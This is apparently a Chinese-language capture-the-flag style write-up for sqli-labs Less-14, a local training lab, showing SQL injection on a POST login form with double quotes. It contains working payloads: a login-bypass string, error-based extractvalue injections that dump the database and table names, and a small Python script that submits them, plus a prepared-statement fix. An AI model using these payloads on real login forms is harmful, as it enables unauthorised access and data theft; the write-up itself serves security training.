---
layout: post
title: sqli-labs - Less-14 POST 双注入（双引号）Writeup
platform: sqli-labs
date: 2026-11-10 08:25:00 +0800
categories: CTF
---

sqli-labs - Less-14 POST 双注入（双引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-14 → POST - Double Injection - Double quotes - String（登录框 + 双引号）
- 地址：`http://127.0.0.1:8080/Less-14/`
- 题型：Web / SQL 注入
- 考点：**POST 登录框：双引号闭合 → 万能密码 / 报错注入**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=admin" #                           → flag.jpg（登录成功）
uname=1" and extractvalue(1,concat(0x7e,database())) #
                                         → XPATH syntax error: '~security'
```

二、题目分析

**① 源码**

```php
@$sql = "SELECT username, password FROM users WHERE username=\"$uname\" and password=\"$passwd\" LIMIT 0,1";
```

**② 和 Less-13 的差别**

| | Less-13 | Less-14 |
|---|---|---|
| 引号 | `'` | `"` |
| 括号 | 有 `('...')` | 无 |
| 闭合 | `')` | `"` |
| 打赏 | 相同 | 相同 |

**③ 判断方法**

```text
uname=admin' #   → slap.jpg（单引号不对）
uname=admin" #   → flag.jpg  ★ 双引号才对
```

三、解题步骤

**第一步：万能密码**

```text
uname = admin" #
passwd = 任意
→ 拼接：WHERE username="admin" #" and password="任意"
→ 注释掉密码 → flag.jpg
```

**第二步：报错注入**

```text
uname = 1" and extractvalue(1,concat(0x7e,database())) #
→ '~security'

uname = 1" and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
→ '~emails,referers,uagents,users'
```

**第三步：脚本**

```python
import requests
url = "http://127.0.0.1:8080/Less-14/"
def login(u, p="x"):
    r = requests.post(url, data={"uname": u, "passwd": p, "submit": "Submit"}, timeout=10)
    return "flag.jpg" if "flag.jpg" in r.text else "slap.jpg"
print(login('admin" #'))
print(login('1" and extractvalue(1,concat(0x7e,database())) #'))
```

四、延伸知识

**① 单引号/双引号怎么快速判断**

```text
方法一：看报错（有报错时最快）
方法二：看页面变化（图片/长度/状态码）
方法三：两个都试一遍，# 注释后谁成功谁对
```

**② 报错注入函数**

| 函数 | 特点 |
|---|---|
| `extractvalue(1, x)` | 一次最多 32 字节 |
| `updatexml(1, x, 1)` | 同上，报错格式不同 |
| `floor(rand()*2)` | 需要 group by，复杂 |

**③ 防御**

```php
$stmt = $pdo->prepare("SELECT username FROM users WHERE username=? AND password=?");
$stmt->execute([$uname, $passwd]);
```

五、总结

- **本题核心：同 Less-13，只是引号从单引号换成双引号。**

- 三步方法论：

```text
① 报错/图片判断闭合：' 还是 "
② 万能密码：admin" #
③ 报错注入：extractvalue
```

- **三个必记要点**：

```text
① Less-13 ~ Less-16 的区别只在"引号 + 括号"的组合
② 图片名（flag.jpg / slap.jpg）就是布尔信号
③ 报错注入一次 32 字节，长数据分段
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-14 = Less-13 换双引号：闭合从 ') 变成 "                  │
│                                                              │
│  万能密码：admin" #                                           │
│  报错注入：1" and extractvalue(1,concat(0x7e,database())) #   │
│                                                              │
│  ★ 四个关卡只差一个字符：'  ')  "  ")                          │
└──────────────────────────────────────────────────────────────┘
```
